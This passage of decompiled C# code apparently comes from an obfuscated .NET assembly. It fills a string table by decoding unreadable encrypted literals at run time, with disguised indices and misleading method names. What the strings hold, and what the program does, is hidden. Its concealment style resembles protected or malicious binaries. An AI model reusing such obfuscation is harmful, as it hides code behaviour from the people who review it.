		int num43 = Convert.ToInt32("340", 8);
		string string_253 = "銄鋅鋄鋏鋞鋅鋉銘";
		_003CModule_003E.smethod_0(ref string_253, new object[3] { '\u0eb6', 25440, 8340 });
		array3[num43] = string_253;
		char num44 = array[4];
		string string_254 = "義翨翷翳";
		_003CModule_003E.smethod_0(ref string_254, new object[3] { 884, "\u09c9ग़ȱΐȥ", '愊' });
		array3[(uint)num44] = string_254;
		int num45 = Convert.ToInt32("342", 8);
		string string_255 = "某枎柉果";
		_003CModule_003E.smethod_0(ref string_255, new object[4] { "ٳ㱽թ௩\u0301", 2006, 'ȷ', 1710 });
		array3[num45] = string_255;
		int num46 = Convert.ToInt32("e3", 16);
		string string_256 = "孹嬧嬶嬺";
		_003CModule_003E.smethod_0(ref string_256, new object[3] { "\u00a0㤴\u00026\u0004", false, 8519 });
		array3[num46] = string_256;
		int num47 = _003CModule_003E.AssemblyVersionCompatibility[2];
		string string_257 = "\udc1a\udc46\udc07\udc50";
		_003CModule_003E.smethod_0(ref string_257, new object[2] { 8126, "ሮꩈ" });
		array3[num47] = string_257;
		int num48 = Convert.ToInt32("e5", 16);
		string string_258 = "胦肧肾肩";
		_003CModule_003E.smethod_0(ref string_258, new object[5] { 299, 'ᅳ', 27965, '#', 202 });
		array3[num48] = string_258;
		int num49 = Marshal.SizeOf(typeof(GetComObjectData));
		string string_259 = "瓝璂璑璑";
		_003CModule_003E.smethod_0(ref string_259, new object[3] { false, "⩎㢹", 4588 });
		array3[num49] = string_259;
		string string_260 = "用畷畤畱";
		_003CModule_003E.smethod_0(ref string_260, new object[3] { 363, 1815, "嚪\u0ac6ଔ" });
		array3[231] = string_260;
		string string_261 = "맲릭릾릳";
		_003CModule_003E.smethod_0(ref string_261, new object[4] { false, 'ҧ', 43937, 2452 });
		array3[232] = string_261;
		int result = Result;
		string string_262 = "튅튂튈튈";
		_003CModule_003E.smethod_0(ref string_262, new object[4] { 2019, 46942, 'ந', "ӯ\u0314" });
		array3[result] = string_262;
		string string_263 = "얙엖엞";
		_003CModule_003E.smethod_0(ref string_263, new object[3] { '༪', 44313, 'ॴ' });
		array3[234] = string_263;
		int num50 = _003CModule_003E.AssemblyVersionCompatibility[3];
		string string_264 = "\uebe1\uebab\uebb8\ueba8";
		_003CModule_003E.smethod_0(ref string_264, new object[5] { "ץrq\v\u0001\u0010", "⻡\u0db2\u000e\u0003\u0003", false, 42807, 269 });
		array3[num50] = string_264;
		int num51 = Convert.ToInt32("ec", 16);
		string string_265 = "辰迺迩迪";
		_003CModule_003E.smethod_0(ref string_265, new object[4] { false, '\\', 1973, 34701 });
		array3[num51] = string_265;
		string string_266 = "䜪䝠䝼䝢";
		_003CModule_003E.smethod_0(ref string_266, new object[2] { 'ƀ', 17796 });
		array3[237] = string_266;
		string string_267 = "ﲵﳿﳬﳽ";
		_003CModule_003E.smethod_0(ref string_267, new object[3] { '勞', 31031, 12422 });
		array3[238] = string_267;
		int num52 = Convert.ToInt32("ef", 16);
		string string_268 = "\uf668\uf622\uf635\uf632";
		_003CModule_003E.smethod_0(ref string_268, new object[3] { "ɳ৩\u0953\u0821ě¹Ŧ", 42020, 'ㄘ' });
		array3[num52] = string_268;
		GetParamCustData = array3;
		FindIndex = new Random();
	}
}
